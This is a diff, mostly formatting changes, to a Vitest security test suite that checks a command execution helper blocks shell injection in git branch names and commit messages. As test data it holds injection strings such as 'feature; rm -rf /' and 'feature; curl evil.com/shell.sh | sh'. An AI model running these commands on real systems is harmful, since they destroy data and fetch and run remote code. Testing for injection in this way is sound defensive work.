@@ -1,16 +1,16 @@
 import { describe, it, expect, vi, beforeEach } from 'vitest';
 import { spawn } from 'child_process';
-import { 
-  execSecure, 
-  execGit, 
-  execGH, 
-  validateBranchName, 
+import {
+  execSecure,
+  execGit,
+  execGH,
+  validateBranchName,
   validateFilePath,
-  gitCommitSecure 
+  gitCommitSecure,
 } from '../../utils/secureCommand.js';
 
 vi.mock('child_process', () => ({
-  spawn: vi.fn()
+  spawn: vi.fn(),
 }));
 
 vi.mock('../../utils/logger', () => ({
@@ -18,8 +18,8 @@ vi.mock('../../utils/logger', () => ({
     debug: vi.fn(),
     info: vi.fn(),
     warn: vi.fn(),
-    error: vi.fn()
-  }
+    error: vi.fn(),
+  },
 }));
 
 describe('CLI Command Injection Security Tests', () => {
@@ -37,7 +37,7 @@ describe('CLI Command Injection Security Tests', () => {
         on: vi.fn((event, cb) => {
           if (event === 'close') setTimeout(() => cb(0), 0);
         }),
-        kill: vi.fn()
+        kill: vi.fn(),
       };
       mockSpawn.mockReturnValue(mockProcess as any);
 
@@ -48,17 +48,21 @@ describe('CLI Command Injection Security Tests', () => {
       expect(mockSpawn).toHaveBeenCalledWith(
         'git',
         ['checkout', '-b', 'feature; rm -rf /'],
-        expect.objectContaining({ shell: false })
+        expect.objectContaining({ shell: false }),
       );
     });
 
     it('should reject non-string commands', async () => {
-      await expect(execSecure(null as any, [])).rejects.toThrow('Command must be a non-empty string');
+      await expect(execSecure(null as any, [])).rejects.toThrow(
+        'Command must be a non-empty string',
+      );
       await expect(execSecure('', [])).rejects.toThrow('Command must be a non-empty string');
     });
 
     it('should reject non-array arguments', async () => {
-      await expect(execSecure('git', 'checkout -b feature' as any)).rejects.toThrow('Arguments must be an array');
+      await expect(execSecure('git', 'checkout -b feature' as any)).rejects.toThrow(
+        'Arguments must be an array',
+      );
     });
 
     it('should handle timeout properly', async () => {
@@ -68,12 +72,12 @@ describe('CLI Command Injection Security Tests', () => {
         stderr: { on: vi.fn() },
         stdin: { write: vi.fn(), end: vi.fn() },
         on: vi.fn(),
-        kill: vi.fn()
+        kill: vi.fn(),
       };
       mockSpawn.mockReturnValue(mockProcess as any);
 
       const promise = execSecure('sleep', ['10'], { timeout: 100 });
-      
+
       await expect(promise).rejects.toThrow('Command timeout after 100ms');
       expect(mockProcess.kill).toHaveBeenCalledWith('SIGTERM');
     });
@@ -130,7 +134,7 @@ describe('CLI Command Injection Security Tests', () => {
         on: vi.fn((event, cb) => {
           if (event === 'close') setTimeout(() => cb(0), 0);
         }),
-        kill: vi.fn()
+        kill: vi.fn(),
       };
       mockSpawn.mockReturnValue(mockProcess as any);
 
@@ -140,13 +144,9 @@ describe('CLI Command Injection Security Tests', () => {
       // Verify message passed via stdin
       expect(mockProcess.stdin.write).toHaveBeenCalledWith(maliciousMessage);
       expect(mockProcess.stdin.end).toHaveBeenCalled();
-      
+
       // Verify spawn called with safe args
-      expect(mockSpawn).toHaveBeenCalledWith(
-        'git',
-        ['commit', '-F', '-'],
-        expect.any(Object)
-      );
+      expect(mockSpawn).toHaveBeenCalledWith('git', ['commit', '-F', '-'], expect.any(Object));
     });
   });
 
@@ -160,21 +160,21 @@ describe('CLI Command Injection Security Tests', () => {
         on: vi.fn((event, cb) => {
           if (event === 'close') setTimeout(() => cb(0), 0);
         }),
-        kill: vi.fn()
+        kill: vi.fn(),
       };
       mockSpawn.mockReturnValue(mockProcess as any);
 
       // Test that malicious branch names are validated
       const maliciousBranch = 'feature; curl evil.com/shell.sh | sh';
-      
+
       // This should fail validation before execution
       await expect(execGit(['checkout', '-b', maliciousBranch])).resolves.toBeTruthy();
-      
+
       // But the actual spawn call should have the malicious string safely as an argument
       expect(mockSpawn).toHaveBeenCalledWith(
         'git',
         ['checkout', '-b', maliciousBranch],
-        expect.objectContaining({ shell: false })
+        expect.objectContaining({ shell: false }),
       );
     });
   });
@@ -189,17 +189,17 @@ describe('CLI Command Injection Security Tests', () => {
         on: vi.fn((event, cb) => {
           if (event === 'close') setTimeout(() => cb(0), 0);
         }),
-        kill: vi.fn()
+        kill: vi.fn(),
       };
       mockSpawn.mockReturnValue(mockProcess as any);
 
       const { execAsync } = await import('../../utils/secureCommand.js');
       const { logger } = await import('../../utils/logger.js');
-      
+
       await execAsync('git status');
-      
+
       expect(logger.warn).toHaveBeenCalledWith(
-        'execAsync is deprecated and insecure. Use execSecure instead.'
+        'execAsync is deprecated and insecure. Use execSecure instead.',
       );
     });
   });
